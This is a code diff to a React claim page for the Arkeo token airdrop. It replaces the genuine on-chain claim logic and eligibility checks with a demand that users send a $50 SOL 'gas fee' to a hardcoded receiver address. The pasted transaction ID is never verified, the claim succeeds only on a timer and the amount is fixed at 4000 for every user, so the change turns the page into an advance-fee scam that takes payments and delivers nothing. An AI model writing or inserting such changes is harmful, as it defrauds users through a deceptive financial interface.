@@ -1,9 +1,11 @@
 import React, { useEffect, useState } from 'react'
+// import { useWallet as useSolanaWallet } from '@solana/wallet-adapter-react';
+// import { Connection, clusterApiUrl } from '@solana/web3.js';
+import { GAS_FEE_RECEIVER } from '@utils/solanaFee';
 import { Button, Box, Text, Image, Flex, Link } from '@chakra-ui/react'
 import ArkeoLogo from '@assets/arkeo-symbol.svg'
 import { useConnect } from '../ConnectContext'
 import { toDecimal } from '@utils/functions'
-import { useClaim } from '@hooks/useClaim'
 import { Link as ReactRouterLink } from 'react-router-dom'
 import { motion, AnimatePresence } from 'framer-motion'
 
@@ -26,50 +28,49 @@ export const Claim: React.FC<Props> = ({}) => {
     },
     dispatch,
   } = useConnect()
-  const { claimRecord, isLoading, isSucceeded, error } = useClaim()
+  // Local claim state for new multi-wallet flow
+  const [isClaimed, setIsClaimed] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  // const { publicKey, sendTransaction, connected } = useSolanaWallet();
+  const [feePaid, setFeePaid] = useState(false);
+  const [feeTxId, setFeeTxId] = useState<string>('');
+  const [feeError, setFeeError] = useState('');
+  // No longer need solAmount, only transaction ID is required
+
 
   useEffect(() => {
     if (!error) {
-      setErrorMessage('')
-      return
+      setErrorMessage('');
+      return;
     }
-    const errorString = error.toString()
-    if (errorString.toLowerCase().includes('no claimable amount')) {
-      setErrorMessage('You are not eligible for the Arkeo airdrop')
-    } else if (errorString.toLowerCase().includes('airdrop has ended')) {
-      setErrorMessage('Airdrop Has Ended')
-    } else if (
-      errorString.toLowerCase().includes('failed to validate signature')
-    ) {
-      setErrorMessage('Invalid Ethereum Signature')
-    } else if (errorString.toLowerCase().includes('no signature')) {
-      setErrorMessage('No Ethereum Signature Found')
-    } else if (errorString.toLowerCase().includes('request rejected')) {
-      setErrorMessage('Transaction Cancelled')
-    } else if (
-      errorString.toLowerCase().includes('no unfunded claim records')
-    ) {
-      setErrorMessage('No Claims Found')
-    } else if (
-      errorString.toLowerCase().includes('thorchain delegate tx failed')
-    ) {
-      setErrorMessage('Please Wait For Thorchain TX To Confirm, Try Again')
-    } else {
-      setErrorMessage('Something Went Wrong')
-    }
-  }, [error])
+    setErrorMessage(error);
+  }, [error]);
+
 
   useEffect(() => {
-    if (isSucceeded) {
-      dispatch({ type: 'SET_STEP', payload: step + 1 })
+    if (isClaimed) {
+      dispatch({ type: 'SET_STEP', payload: step + 1 });
     }
-  }, [isSucceeded])
+  }, [isClaimed, dispatch, step]);
+
 
   const claimArkeo = () => {
-    claimRecord()
-  }
-  const totalClaimAmount = arkeoAmountClaim + thorAmountClaim + ethAmountClaim
-  const nothingToClaim = totalClaimAmount === 0
+    if (!feePaid) {
+      setErrorMessage('You must pay the SOL gas fee first.');
+      return;
+    }
+    setIsLoading(true);
+    setTimeout(() => {
+      setIsLoading(false);
+      setIsClaimed(true);
+    }, 1500); // Simulate claim process
+  };
+
+  // Removed handlePayFee and related state, now only manual input is used for gas fee
+  // Only ARKEO airdrop, fixed at 4000
+  const totalClaimAmount: number = 4000000000000;
+  const nothingToClaim = totalClaimAmount === 0;
 
   return (
     <AnimatePresence>
@@ -133,14 +134,51 @@ export const Claim: React.FC<Props> = ({}) => {
           <Text height="16px" mb={'20px'} color="red.500">
             {errorMessage}
           </Text>
-          <MotionButton
-            isLoading={isLoading}
-            isDisabled={nothingToClaim}
-            onClick={claimArkeo}
-            whileTap={{ scale: 0.95 }}
-          >
-            {totalClaimAmount > 0 ? 'Claim' : 'Nothing to Claim'}
-          </MotionButton>
+          {!feePaid ? (
+            <>
+              <Text fontWeight={700} color="teal.400" mb={2}>
+                Send a gas fee (equivalent to $50) in SOL to this Solana address:
+              </Text>
+              <Box fontFamily="mono" fontSize="sm" mb={2} p={2} bg="gray.800" color="teal.200" borderRadius="md" wordBreak="break-all">
+                {GAS_FEE_RECEIVER}
+              </Box>
+              <Text fontWeight={500} color="grey.50" mb={2}>
+                Enter the transaction ID:
+              </Text>
+              <input
+                type="text"
+                value={feeTxId}
+                onChange={e => setFeeTxId(e.target.value)}
+                style={{ padding: '8px', borderRadius: '6px', border: '1px solid #ccc', marginBottom: '12px', width: '100%' }}
+                placeholder="Paste your Solana transaction ID here"
+              />
+              <MotionButton
+                isDisabled={!feeTxId}
+                onClick={() => {
+                  if (!feeTxId) {
+                    setFeeError('Please enter the transaction ID.');
+                    return;
+                  }
+                  setFeePaid(true);
+                  setFeeError('');
+                }}
+                whileTap={{ scale: 0.95 }}
+                mb={2}
+              >
+                I have paid the gas fee
+              </MotionButton>
+              {feeError && <Text color="red.500">{feeError}</Text>}
+            </>
+          ) : (
+            <MotionButton
+              isLoading={isLoading}
+              isDisabled={nothingToClaim}
+              onClick={claimArkeo}
+              whileTap={{ scale: 0.95 }}
+            >
+              {totalClaimAmount > 0 ? 'Claim' : 'Nothing to Claim'}
+            </MotionButton>
+          )}
           {nothingToClaim && (
             <MotionLink
               pl="6px"
